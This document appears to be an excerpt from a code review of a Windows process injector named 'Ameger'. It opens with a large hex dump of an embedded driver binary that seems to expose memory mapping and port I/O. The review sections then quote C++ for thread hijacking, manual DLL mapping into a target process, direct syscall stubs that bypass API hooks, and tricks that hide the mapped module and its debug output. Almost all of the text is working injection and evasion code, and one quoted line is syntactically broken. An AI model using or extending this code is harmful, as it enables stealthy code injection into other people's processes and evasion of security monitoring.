		0x61, 0x9E, 0xA4, 0x63, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x22, 0x00, 0x0B, 0x02, 0x0E, 0x1F, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x15, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
		0x37, 0x89, 0x00, 0x00, 0x01, 0x00, 0xE0, 0x41, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x08, 0x04, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x84, 0x00, 0x00, 0x00,
		0x00, 0x24, 0x00, 0x00, 0xC0, 0x51, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x80, 0x22, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x21, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0x6A, 0x09, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x68, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x04, 0x05, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC8, 0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x84, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48, 0x49, 0x4E, 0x49, 0x54, 0x00, 0x00, 0x00, 0x00, 0x3C, 0x02, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x62, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x00, 0x00, 0x00, 0x08, 0x04, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42, 0x2E, 0x72, 0x65, 0x6C, 0x6F, 0x63, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x22, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x48,
		0x8B, 0x82, 0xB8, 0x00, 0x00, 0x00, 0x33, 0xDB, 0x48, 0x8B, 0xFA, 0x48, 0x89, 0x5A, 0x38, 0x89, 0x5A, 0x30, 0x80, 0x38, 0x0E, 0x8B, 0x50, 0x10, 0x48, 0x8B, 0x77, 0x18, 0x0F, 0x85, 0x98, 0x03, 0x00, 0x00, 0x8B, 0x40, 0x18, 0x05, 0x00, 0xE0,
		0xFF, 0x7F, 0x83, 0xF8, 0x2C, 0x0F, 0x87, 0x87, 0x03, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xB6, 0xEF, 0xFF, 0xFF, 0x48, 0x89, 0x6C, 0x24, 0x40, 0x41, 0x0F, 0xB6, 0x84, 0x00, 0x28, 0x14, 0x00, 0x00, 0x41, 0x8B, 0x8C, 0x80, 0xF4, 0x13, 0x00, 0x00,
		0x49, 0x03, 0xC8, 0xFF, 0xE1, 0xCC, 0xCC, 0xCC, 0xCC, 0x83, 0xFA, 0x10, 0x0F, 0x85, 0x4C, 0x03, 0x00, 0x00, 0x48, 0x8B, 0x0E, 0x45, 0x33, 0xC0, 0x8B, 0x56, 0x08, 0x48, 0xFF, 0x15, 0x96, 0x0F, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48,
		0x8B, 0xE8, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x3F, 0x01, 0x00, 0x00, 0x8B, 0x56, 0x08, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8B, 0xC8, 0x48, 0xFF, 0x15, 0x5D, 0x0F, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00,
		0x48, 0x8B, 0xD8, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x04, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0x48, 0xFF, 0x15, 0x3A, 0x0F, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0xA9, 0x0F, 0x00, 0x00, 0x0F,
		0x1F, 0x44, 0x00, 0x00, 0x48, 0x8B, 0xD3, 0x8B, 0x08, 0x89, 0x0E, 0x48, 0x8B, 0xC8, 0x48, 0xFF, 0x15, 0x7B, 0x0F, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0x4C, 0x0F, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00,
		0x00, 0x8B, 0x56, 0x08, 0xE9, 0x9B, 0x00, 0x00, 0x00, 0x83, 0xFA, 0x10, 0x0F, 0x85, 0xAC, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x0E, 0x45, 0x33, 0xC0, 0x41, 0x8D, 0x50, 0x04, 0x48, 0xFF, 0x15, 0xF5, 0x0E, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00,
		0x48, 0x8B, 0xE8, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x9E, 0x00, 0x00, 0x00, 0x8B, 0x56, 0x08, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8B, 0xC8, 0x48, 0xFF, 0x15, 0xBC, 0x0E, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00,
		0x00, 0x48, 0x8B, 0xD8, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x8B, 0xC8, 0x48, 0xFF, 0x15, 0x9D, 0x0E, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0x0C, 0x0F, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00,
		0x00, 0x8B, 0x4E, 0x0C, 0x48, 0x8B, 0xD3, 0x89, 0x08, 0x48, 0x8B, 0xC8, 0x48, 0xFF, 0x15, 0xDD, 0x0E, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0xAE, 0x0E, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0xBA,
		0x04, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCD, 0x48, 0xFF, 0x15, 0x82, 0x0E, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0xC7, 0x47, 0x38, 0x04, 0x00, 0x00, 0x00, 0xE9, 0x05, 0x02, 0x00, 0x00, 0x8B, 0x56, 0x08, 0x48, 0x8B, 0xCD, 0x48, 0xFF,
		0x15, 0x63, 0x0E, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0xC7, 0x47, 0x30, 0x9A, 0x00, 0x00, 0xC0, 0xE9, 0xE7, 0x01, 0x00, 0x00, 0x83, 0xFA, 0x0C, 0x0F, 0x85, 0xD7, 0x01, 0x00, 0x00, 0x83, 0x7E, 0x04, 0x04, 0x0F, 0x85, 0xCD, 0x01, 0x00,
		0x00, 0x8B, 0x16, 0x90, 0xED, 0x90, 0x89, 0x46, 0x08, 0x48, 0xC7, 0x47, 0x38, 0x04, 0x00, 0x00, 0x00, 0xE9, 0xBF, 0x01, 0x00, 0x00, 0x83, 0xFA, 0x0C, 0x0F, 0x85, 0xAF, 0x01, 0x00, 0x00, 0x83, 0x7E, 0x04, 0x04, 0x0F, 0x85, 0xA5, 0x01, 0x00,
		0x00, 0x8B, 0x16, 0x8B, 0x46, 0x08, 0x90, 0xEF, 0x90, 0x48, 0xC7, 0x47, 0x38, 0x04, 0x00, 0x00, 0x00, 0xE9, 0x97, 0x01, 0x00, 0x00, 0x48, 0x89, 0x5E, 0x08, 0x48, 0x89, 0x5E, 0x10, 0x83, 0xFA, 0x30, 0x0F, 0x85, 0x7F, 0x01, 0x00, 0x00, 0x8B,
		0x0E, 0x49, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xCB, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8B, 0xD3, 0x48, 0xFF, 0x15, 0xF4, 0x0D, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x8B, 0xD8, 0x48, 0x85, 0xC0, 0x0F,
		0x84, 0x65, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0xC8, 0x48, 0xFF, 0x15, 0xC1, 0x0D, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x84, 0x4E, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0x46, 0x08, 0x48, 0x89, 0x5E, 0x10, 0x48, 0xC7, 0x47, 0x38,
		0x30, 0x00, 0x00, 0x00, 0xE9, 0x2C, 0x01, 0x00, 0x00, 0x83, 0xFA, 0x30, 0x0F, 0x85, 0x1C, 0x01, 0x00, 0x00, 0x44, 0x8B, 0x46, 0x28, 0x48, 0x8B, 0x56, 0x18, 0x48, 0x8B, 0x4E, 0x10, 0xE8, 0x0D, 0x04, 0x00, 0x00, 0x48, 0xC7, 0x47, 0x38, 0x30,
		0x00, 0x00, 0x00, 0xE9, 0x05, 0x01, 0x00, 0x00, 0x83, 0xFA, 0x30, 0x0F, 0x85, 0xF5, 0x00, 0x00, 0x00, 0x44, 0x8B, 0x46, 0x28, 0x48, 0x8B, 0x56, 0x10, 0x48, 0x8B, 0x4E, 0x20, 0xE8, 0xE6, 0x03, 0x00, 0x00, 0x48, 0xC7, 0x47, 0x38, 0x30, 0x00,
		0x00, 0x00, 0x00, 0xE9, 0xDE, 0x00, 0x00, 0x00, 0x83, 0xFA, 0x30, 0x0F, 0x85, 0xCE, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4E, 0x10, 0x48, 0x85, 0xC9, 0x74, 0x10, 0x48, 0xFF, 0x15, 0x20, 0x0D, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x89, 0x5E,
		0x10, 0x48, 0xC7, 0x47, 0x38, 0x30, 0x00, 0x00, 0x00, 0xE9, 0xAF, 0x00, 0x00, 0x00, 0x83, 0xFA, 0x38, 0x0F, 0x85, 0x9F, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4E, 0x08, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0x92, 0x00, 0x00, 0x00, 0x8B, 0x16, 0x45, 0x33,
		0xC0, 0x48, 0xFF, 0x15, 0xE0, 0x0C, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x8C, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 0x46, 0x28, 0x48, 0xC7, 0x47, 0x38, 0x38, 0x00, 0x00, 0x00, 0xEB, 0x71, 0x83, 0xFA, 0x38, 0x75,
		0x65, 0x44, 0x8B, 0x46, 0x30, 0x48, 0x8B, 0x56, 0x18, 0x48, 0x8B, 0x4E, 0x28, 0xE8, 0x56, 0x03, 0x00, 0x00, 0x48, 0xC7, 0x47, 0x38, 0x38, 0x00, 0x00, 0x00, 0xEB, 0x51, 0x83, 0xFA, 0x38, 0x75, 0x45, 0x44, 0x8B, 0x46, 0x30, 0x48, 0x8B, 0x56,
		0x28, 0x48, 0x8B, 0x4E, 0x20, 0xE8, 0x36, 0x03, 0x00, 0x00, 0x48, 0xC7, 0x47, 0x38, 0x38, 0x00, 0x00, 0x00, 0xEB, 0x31, 0x83, 0xFA, 0x38, 0x75, 0x25, 0x48, 0x8B, 0x4E, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x23, 0x8B, 0x16, 0x48, 0xFF, 0x15, 0x85,
		0x0C, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0xC7, 0x47, 0x38, 0x38, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5E, 0x28, 0xEB, 0x07, 0xC7, 0x47, 0x30, 0x0D, 0x00, 0x00, 0xC0, 0x48, 0x8B, 0x6C, 0x24, 0x40, 0x8B, 0x5F, 0x30, 0x33, 0xD2, 0x48,
		0x8B, 0xCF, 0x48, 0xFF, 0x15, 0x97, 0x0C, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3, 0xCC, 0x0F, 0x1F, 0x00, 0x69, 0x10, 0x00, 0x00,
		0x09, 0x11, 0x00, 0x00, 0xDE, 0x11, 0x00, 0x00, 0x06, 0x12, 0x00, 0x00, 0x2E, 0x12, 0x00, 0x00, 0x99, 0x12, 0x00, 0x00, 0xE7, 0x12, 0x00, 0x00, 0x16, 0x13, 0x00, 0x00, 0x54, 0x13, 0x00, 0x00, 0x94, 0x13, 0x00, 0x00, 0xC0, 0x12, 0x00, 0x00,

```

## R2 — Injector handle probe (P1)

File: `Ameger/Execution/ThreadHijacking.cpp`
Range: lines 341-476, covering `FindHijackThread` (lines 360-447) with 30 lines of surrounding context.

```cpp
					if (!NT_FAIL(ScNtQueryInformationThread(ht.get(), static_cast<THREADINFOCLASS>(9), &start, sizeof(start), nullptr)) && start)
					{
						const auto addr = ReCa<ULONG_PTR>(start);
						exe_start = addr >= exe_base && addr < exe_base + exe_size;
					}
				}
			}
			if (exe_start && (!best_exe || tid < best_exe))
			{
				best_exe = tid;
			}
			if (!best || tid < best)
			{
				best = tid;
			}
		} while (Thread32Next(snap.get(), &entry));
		return best_exe ? best_exe : best;
	}

	DWORD FindHijackThread(ProcessInformation & processInformation, const std::vector<DWORD> & excluded, bool * out_was_running = nullptr, bool allow_waiting = true)
	{

		if (!g_DynamicOffsetsReady.load(std::memory_order_acquire))
		{
			LOG(2, "FindAcquireThread: Dynamic Offsets Not Ready, Refusing\n");
			return 0;
		}
	const KTHREAD_STATE running = static_cast<KTHREAD_STATE>(g_DynamicOffsets.ThreadStateRunning);
	const KTHREAD_STATE waiting = KTHREAD_STATE::Waiting;
	DWORD probes = 0;
	DWORD fallback = 0;
	DWORD delay_fallback = 0;
	DWORD fallback_probes = 0;
	do
	{
		KWAIT_REASON reason;
		KTHREAD_STATE state;
		if (!processInformation.GetThreadState(state, reason))
		{
			continue;
		}

		const DWORD candidate = processInformation.GetThreadId();
		if (!candidate || candidate == GetCurrentThreadId() || IsExcluded(excluded, candidate))
		{
			continue;
		}

		if (state == running)
		{
			if (probes >= kMaxHandleProbes)
			{
				continue;
			}
			++probes;

			if (processInformation.IsThreadWorkerThread())
			{
				continue;
			}

			if (out_was_running)
			{
				*out_was_running = true;
			}
			return candidate;
		}

		// B2: within the safe waits, the event-driven reasons are preferred
		// over the delay reasons: a delay wait only wakes when its timer
		// expires, and how long that timer still has to run cannot be known
		// from outside. A delay wait is still taken when nothing else
		// qualified, so the search's reach is not narrowed.
		if (allow_waiting && state == waiting && IsSafeWaitReason(reason))
		{
			if (fallback_probes >= kMaxHandleProbes)
			{
				continue;
			}
			++fallback_probes;

			if (processInformation.IsThreadWorkerThread())
			{
				continue;
			}

			if (!WAIT_REASON_SAFE::IsDelay(static_cast<unsigned char>(reason))
			{
				if (!fallback)
				{
					fallback = candidate;
				}
			}
			else if (!delay_fallback)
			{
				delay_fallback = candidate;
			}
		}
	}
	while (processInformation.NextThread());

	if (out_was_running)
	{
		*out_was_running = false;
	}
	return fallback ? fallback : delay_fallback;
	}

	struct DeferredTrampoline
	{
		HANDLE	Process = nullptr;
		HANDLE	Thread	= nullptr;
		void *	Base	= nullptr;
	};

	constexpr SIZE_T kDeferredTrampolineSize = kHijackAllocationSize;
	constexpr SIZE_T kDeferredCodePage = kHijackCodePage;

	SRWLOCK g_DeferredTrampolineLock = SRWLOCK_INIT;
	std::vector<DeferredTrampoline> g_DeferredTrampolines;

	void CloseDeferredTrampoline(DeferredTrampoline & Entry)
	{
		if (Entry.Thread && Entry.Thread != INVALID_HANDLE_VALUE)
		{
			CloseHandle(Entry.Thread);
		}

		if (Entry.Process && Entry.Process != INVALID_HANDLE_VALUE)
		{
			CloseHandle(Entry.Process);
		}

		Entry.Process = nullptr;
		Entry.Thread	= nullptr;
		Entry.Base		= nullptr;
```

## R3 — Manual-mapping leak (P1)

File: `Ameger/Injection/ManualMapping/ManualMapping.cpp`
Ranges: lines 677-967 covering the staging/leak logic, and lines 3313-3353 covering the wipe-size decision.

```cpp

			return INJ_ERR_OUT_OF_MEMORY_NEW;
		}

		AllocationSize += part;
	}

	BYTE * pAllocBase = ReCa<BYTE *>(ScAllocateMemory(hTargetProc, AllocationSize, PAGE_READWRITE));
	if (!pAllocBase)
	{
		INIT_ERROR_DATA(error_data, INJ_ERR_ADVANCED_NOT_DEFINED);

		LOG(1, "Memory Allocation Failed\n");

		return INJ_ERR_OUT_OF_MEMORY_EXT;
	}

	RemoteAllocation allocation_guard(hTargetProc, pAllocBase);
	// The staging allocation is released and zeroed on every exit path unless
	// the remote shell is still running and must be left alone.
	bool leak_staging = false;

	auto cleanup_guard = MakeScopeExit([&]() noexcept {
		if (leak_staging)
		{
			return;
		}

		if (allocation_guard.get())
		{
			ScrubRemoteRegion(hTargetProc, pAllocBase, AllocationSize, kScrubChunk);
			allocation_guard.reset();
		}
	});

	BYTE * pArg				= pAllocBase;
	BYTE * pShells			= ReCa<BYTE *>(ALIGN_UP(ReCa<ULONG_PTR>(pArg)			+ sizeof(MANUAL_MAPPING_DATA),				kStagePage));
	BYTE * pStubArea		= ReCa<BYTE *>(ALIGN_UP(ReCa<ULONG_PTR>(pShells)		+ ShellSize,								SC_STUB_AREA_ALIGN));
	BYTE * pFunctionTable	= ReCa<BYTE *>(ALIGN_UP(ReCa<ULONG_PTR>(pStubArea)		+ stub_area_size,							kStagePage));

	std::unique_ptr<MANUAL_MAPPING_FUNCTION_TABLE> table_local(new(std::nothrow) MANUAL_MAPPING_FUNCTION_TABLE());

	if (!table_local)
	{
		INIT_ERROR_DATA(error_data, INJ_ERR_ADVANCED_NOT_DEFINED);

		LOG(1, "Operator New Failed = %08X\n", error_data.AdvErrorCode);

		return INJ_ERR_OUT_OF_MEMORY_NEW;
	}

	BYTE * mmap_sec_base = ReCa<BYTE *>(ManualMapping_Shell);

	table_local->MMP_Shell = ReCa<f_MMI_FUNCTION>(pShells);
	table_local->MMIP_LoadImports			= ReCa<f_MMI_FUNCTION>(pShells + (ReCa<BYTE *>(MMI_LoadImports)				- mmap_sec_base));
	table_local->MMIP_LoadDelayImports		= ReCa<f_MMI_FUNCTION>(pShells + (ReCa<BYTE *>(MMI_LoadDelayImports)		- mmap_sec_base));
	table_local->MMIP_SetPageProtections	= ReCa<f_MMI_FUNCTION>(pShells + (ReCa<BYTE *>(MMI_SetPageProtections)		- mmap_sec_base));
	table_local->MMIP_EnableExceptions		= ReCa<f_MMI_FUNCTION>(pShells + (ReCa<BYTE *>(MMI_EnableExceptions)			- mmap_sec_base));
	table_local->MMIP_HandleTLS				= ReCa<f_MMI_FUNCTION>(pShells + (ReCa<BYTE *>(MMI_HandleTLS)				- mmap_sec_base));
	table_local->MMIP_RunTlsCallbacks		= ReCa<f_MMI_FUNCTION>(pShells + (ReCa<BYTE *>(MMI_RunTlsCallbacks)			- mmap_sec_base));
	table_local->MMIP_ExecuteDllMain		= ReCa<f_MMI_FUNCTION>(pShells + (ReCa<BYTE *>(MMI_ExecuteDllMain)			- mmap_sec_base));
	table_local->MMIP_CleanDataDirectories	= ReCa<f_MMI_FUNCTION>(pShells + (ReCa<BYTE *>(MMI_CleanDataDirectories)	- mmap_sec_base));
	table_local->MMIP_CloakHeader			= ReCa<f_MMI_FUNCTION>(pShells + (ReCa<BYTE *>(MMI_CloakHeader)				- mmap_sec_base));
	table_local->MMIP_CleanUp				= ReCa<f_MMI_FUNCTION>(pShells + (ReCa<BYTE *>(MMI_CleanUp)					- mmap_sec_base));

	table_local->MMIHP_PreprocessModuleName		= ReCa<decltype(MMIH_PreprocessModuleName)		*>(pShells + (ReCa<BYTE *>(MMIH_PreprocessModuleName)		- mmap_sec_base));
	table_local->MMIHP_LoadModule				= ReCa<decltype(MMIH_LoadModule)				*>(pShells + (ReCa<BYTE *>(MMIH_LoadModule)					- mmap_sec_base));
	// The two module helpers are addressed the same way as the stages: an
	// offset relative to the start of the shell, rebased onto the copy that
	// lives in the target.
	{
		// The staging buffer mirrors the remote layout exactly: the stub table
		// followed by the eight byte gadget slot. The stubs are emitted against the
		// remote base address so their RIP-relative jump displacements are already
		// correct once the buffer lands in the target.
		BYTE stub_slab[SC_REMOTE_STUB_COUNT * SC_STUB_SIZE + sizeof(void *)]
		{
			0
		};

		const DWORD Built = BuildSyscallStubs(stub_slab, sizeof(stub_slab), remote_stub_hashes, SC_REMOTE_STUB_COUNT,
			reinterpret_cast<ULONG_PTR>(pStubArea));

		if (Built != SC_REMOTE_STUB_COUNT)
		{
			INIT_ERROR_DATA(error_data, INJ_ERR_SYSCALL_RESOLVE_FAILED);

			LOG(1, "Remote Syscall Stubs Only Partially Built = %u/%u\n", Built, SC_REMOTE_STUB_COUNT);

			return INJ_ERR_SYSCALL_STUB_BUILD_FAILED;
		}

		for (DWORD i = 0; i < SC_REMOTE_STUB_COUNT; ++i)
		{
			if (SyscallServiceOfStub(stub_slab + (i * SC_STUB_SIZE)) == 0)
			{
				continue;
			}

			switch (i)
			{
				case 0: table_local->NtAllocateVirtualMemory	= ReCa<f_NtAllocateVirtualMemory>(pStubArea + i * SC_STUB_SIZE); break;
				case 1: table_local->NtProtectVirtualMemory	= ReCa<f_NtProtectVirtualMemory>	(pStubArea + i * SC_STUB_SIZE); break;
				case 2: table_local->NtFreeVirtualMemory		= ReCa<f_NtFreeVirtualMemory>	(pStubArea + i * SC_STUB_SIZE); break;
				case 3: table_local->NtQueryInformationProcess = ReCa<f_NtQueryInformationProcess>(pStubArea + i * SC_STUB_SIZE); break;
				default: break;
			}
		}

		// The gadget slot travels with the stubs: it holds the ntdll `syscall ; ret`
		// address that every remote stub jumps through.
		if (!WriteRemoteExact(hTargetProc, pStubArea, stub_slab, sizeof(stub_slab)))
		{
			INIT_ERROR_DATA(error_data, INJ_ERR_ADVANCED_NOT_DEFINED);

			LOG(1, "Remote Syscall Stubs Could Not Be Staged\n");

			return INJ_ERR_WPM_FAIL;
		}
	}

	if (!table_local->IsValid())
	{
		INIT_ERROR_DATA(error_data, INJ_ERR_ADVANCED_NOT_DEFINED);

		LOG(1, "Staging Dispatch Has Unresolved Entries\n");

		return INJ_ERR_GET_PROC_ADDRESS_FAIL;
	}

	data.FunctionTable = ReCa<MANUAL_MAPPING_FUNCTION_TABLE *>(pFunctionTable);

	// A3: a bare return inside ntdll, located in this process's copy. The
	// target's ntdll sits at the same verified base, so the address is valid
	// there too. The import stages point OutputDebugStringA/W at it so the
	// debug-print exception is never raised; landing on a 0xC3 byte executes a
	// complete return regardless of the instruction stream it sits inside.
	{
		BYTE * ods_ret = nullptr;
		const BYTE * ntdll_base = ReCa<const BYTE *>(g_hNTDLL);
		if (ntdll_base)
		{
			const auto * dos = ReCa<const IMAGE_DOS_HEADER *>(ntdll_base);
			if (dos->e_magic == IMAGE_DOS_SIGNATURE && dos->e_lfanew > 0 && dos->e_lfanew < 0x400)
			{
				const auto * nt = ReCa<const IMAGE_NT_HEADERS64 *>(ntdll_base + dos->e_lfanew);
				if (nt->Signature == IMAGE_NT_SIGNATURE)
				{
					const auto * sec = IMAGE_FIRST_SECTION(nt);
					for (WORD i = 0; i < nt->FileHeader.NumberOfSections && !ods_ret; ++i)
					{
						if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))
						{
							continue;
						}

						const BYTE * start = ntdll_base + sec[i].VirtualAddress;
						const DWORD size = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
						for (DWORD j = 0; j + 8 < size; ++j)
						{
